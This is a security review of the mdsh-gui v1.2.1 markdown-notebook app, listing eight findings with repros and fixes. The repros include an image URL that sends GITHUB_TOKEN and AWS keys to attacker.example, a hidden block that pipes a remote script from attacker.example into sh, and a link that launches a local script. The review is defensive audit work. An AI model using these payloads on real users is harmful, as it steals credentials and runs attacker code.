# mdsh-gui v1.2.1 security review

Scope: `cmd/mdsh-gui` (Go service, asset server, TypeScript frontend) at tag `v1.2.1` (5d18124). The CLI and shared runner are covered in a separate review; shared-code issues that show up through the GUI are listed at the end and flagged as such.

Threat model: the user opens a `.md` file they didn't write (cloned repo, download, attachment). Running its blocks is code execution by design, so the question is what the file can do **beyond** that, or how it can trick the user into running something they didn't see.

Verification: findings 1, 2 and 3 were reproduced with throwaway Go tests against the `notebook` package (not committed). Finding 4 was checked by running `linkTarget` in isolation; launching the app itself couldn't be tested here (no GTK/WebKit in the container).

## Summary

| # | Severity | Finding |
|---|----------|---------|
| 1 | **High** | Opening a file leaks environment variables (tokens, keys) to a remote server, zero clicks |
| 2 | **High** | Blocks hidden by `show=` or an off `mdsh:if` section don't appear in the rendered view but still run on Run all / Run from here |
| 3 | Medium | Saving (and autosave after any run) writes env var values into the `.md` file |
| 4 | Medium | One click on a link opens or launches any local file (`.app`, `.command`, scripts), bypassing run confirmation |
| 5 | Low | No Content-Security-Policy; remote images load freely (tracking, IP disclosure) |
| 6 | Low | Front matter `shell:` is invisible in the rendered view and picks the program every block runs under |
| 7 | Low | `/doc/` asset route exposes every file under every open document's folder to the webview |
| 8 | Info | Settings file written 0644 |

What looked fine: goldmark is used without `html.WithUnsafe`, so raw HTML is dropped and `javascript:` links are emptied (checked); the only `innerHTML` sinks are goldmark output and static SVG icons; all other text goes in via `textContent`; link clicks, middle clicks and the context menu are intercepted so the webview never navigates; `OpenURL` only gets http/https/mailto; `serveDocFile` resolves symlinks before the folder check and only serves regular files; report image inlining only embeds real image types.

---

## 1. High: zero-click exfiltration of environment variables

**Where:** `notebook/prose.go` `layout.part()` substitutes placeholders into the prose markdown **before** goldmark parses it, using `run.NewLookup(..., os.Environ())`; the webview has no CSP (`frontend/index.html`).

**Repro:** open a file containing

```markdown
![logo](https://attacker.example/p.png?t={{$GITHUB_TOKEN}}&k={{$AWS_SECRET_ACCESS_KEY}})
```

`Cells()` returns `<img src="https://attacker.example/p.png?t=ghp_abc123&amp;h=/root">` (verified with `SECRET_TOKEN=ghp_abc123`, `HOME=/root`). The webview fetches it as soon as the document is drawn. No block runs, no click. The same works in link targets with one click, and the image can be 1×1 and invisible.

**Fix (pick one or combine):**
- Don't substitute placeholders inside link/image destinations: substitute on the AST (text nodes only) instead of on the raw markdown, or escape/strip them in URLs.
- Only resolve `{{$VAR}}` caller-env placeholders for variables the document declares or the user allows (e.g. an allowlist like `USER`, `HOME`), or only after the user has run something.
- Add a CSP that blocks remote loads: `img-src 'self' data:; connect-src 'self'; default-src 'self'` (see #5). This alone closes the zero-click channel.

## 2. High: hidden blocks run without being shown

**Where:** `notebook/prose.go` `Cells()` skips a block when `render.Pieces` gives it no code (`if len(code) == 0 { continue }`). `show=` conditions and off `<!-- mdsh:if -->` sections only affect printing (per `docs/spec.md`), so `RunFrom` still runs those blocks.

**Repro:**

````markdown
# Setup

```sh {#hello}
echo hello
```

```sh {#evil show=false}
curl -s https://attacker.example/x | sh
```

<!-- mdsh:if false -->
```sh {#evil2}
touch ~/pwned
```
<!-- mdsh:end -->
````

The rendered view shows one heading and one block (`hello`). Clicking **Run all** or **Run from here** on `hello` runs `evil` and `evil2` too (verified: both marker files were created). `confirm` doesn't help because the author controls it. Only the source pane reveals them.

**Fix:** in the GUI, always draw every runnable block that will run, even if `show=` is false or its section is off. A collapsed card that says "hidden when printed" is enough. Or have Run all / Run from here skip blocks the view doesn't show, but drawing them is simpler and keeps the CLI semantics.

## 3. Medium: env values written into the file on save

**Where:** `render.go` `writeProse` with `WriteBack` writes `ph.Source(v)` for caller-env placeholders; `App.afterRun` autosaves after every run when autosave is on.

**Repro:** a file with `Token: {{$SECRET_TOKEN}}`; run any block; save. The file now holds `{{$SECRET_TOKEN:"ghp_abc123"}}` (verified). With autosave on, running any block is enough. The user then commits or shares the file.

**Fix:** don't store values for `{{$VAR}}` caller-env placeholders on write-back (keep the stored value only for block variables), or limit it to an allowlist. This is shared runner code, so the CLI's `-w` likely does the same; I've left that to the CLI review.

## 4. Medium: link click opens or launches any local file

**Where:** `links.go` `linkTarget` maps any relative path, absolute path or `file:` URL that isn't `.md` to `linkFile`, and `openLink` calls `Browser.OpenFile`, which on macOS is `open <path>` and on Linux `xdg-open`.

**Repro:** `[Read the setup notes](setup.command)` with a `setup.command` beside the doc in the repo. One click runs it in Terminal. `[x](file:///Applications/Utilities/Terminal.app)` or any `.app` also launches. Files from `git clone` carry no quarantine flag, so Gatekeeper won't ask. The link text can say anything; this skips the block confirm entirely.

**Fix:** for `linkFile`, reveal the file in Finder (`Env.OpenFileManager(path, true)`) instead of opening it, or ask first ("Open setup.command with the system?") showing the full path. At minimum refuse executable types and bundles (`.app`, `.command`, `.sh`, `.tool`, `.terminal`, `.desktop`, files with the exec bit) and absolute paths outside the document's folder.

## 5. Low: no Content-Security-Policy

**Where:** `frontend/index.html`, `window.html`, `settings.html` have no CSP meta tag; the asset handler sets no CSP header.

Any remote image in prose or in a stored output region loads on open, telling the author when and from where the file was opened. Today goldmark's safe mode is the only thing standing between the document and the page, which also holds the Wails bindings (`SetSettings` can change `Shell`, `RunBlock` runs code). A CSP is cheap defense in depth.

**Fix:** add `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'">` (adjust for what xterm/CodeMirror need), or set it as a header in `App.assets`. If remote images are wanted, make it a setting, off by default.

## 6. Low: front matter `shell:` is invisible

**Where:** `run.Shell(d)` uses `d.Options.Shell` from front matter, and `env/shell.go` runs `exec.Command(cfg.Path)`. The rendered view drops front matter.

A file can set `shell: /path/to/anything` (or a program shipped beside it) so that the visible `echo hello` is fed to a different interpreter. Running is already code execution, so this is mostly about the user being misled about what runs.

**Fix:** show the effective shell in the toolbar or the options line when it isn't the default, and warn when it isn't a known shell (`sh`, `bash`, `zsh`, `fish`, ...).

## 7. Low: `/doc/` serves whole folder trees

**Where:** `docfiles.go` `underDoc` allows any file under the folder of **any** open document.

Opening `~/README.md` makes everything under `~` (including `~/.ssh`) loadable by the webview at `/doc/...`. Nothing can read it back today because no script from the document runs, but if #5 or a future XSS lands, this becomes a read primitive. `beside()` also passes `../` through, so an image in one tab can point into another tab's folder.

**Fix:** only serve files with image/media extensions (png, jpg, gif, webp, svg, pdf), and/or only paths the renderer emitted (keep a set of URLs from `DocURL`).

## 8. Info: settings file permissions

`settings/settings.go` writes `gui.json` with `0o644` and its folder with `0o755`. It holds recent file paths and the shell override. Use `0o600` / `0o700`.

---

## Shared code seen from the GUI (for the CLI review)

- Placeholder substitution with `os.Environ()` in rendered output and HTML/PDF reports (#1, #3): reports will contain env values in plain text, and HTML reports will load remote images when opened.
- `include` blocks read any path, absolute or `../`, on open (`run/include.go`), and write-back stores the lines in the file. A file can display `~/.ssh/id_rsa` in the GUI and, after a save, embed it in the `.md`.
